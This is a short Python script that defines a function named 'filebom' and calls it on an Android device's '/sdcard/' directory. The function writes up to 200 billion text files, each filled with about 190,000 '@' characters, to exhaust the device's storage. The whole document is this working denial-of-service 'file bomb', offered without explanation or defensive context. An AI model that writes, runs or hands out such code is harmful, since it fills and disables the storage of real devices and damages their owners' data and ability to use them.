import os
#########
def filebom(path,num):
	try:
		text = "@@@@@@@@@@@@@@@@@@@"*10000
		os.chdir(path)
		for i in range(num):
			a = str(i)
			name_file = ""+a+".txt"
			file = open(name_file,"a")
			print()
			file.write(text)
			file.close()
	except FileNotFoundError:
		print("                 File Not Found Error")
	except TypeError:
		print("                 Type Error")
filebom("/sdcard/",200000000000)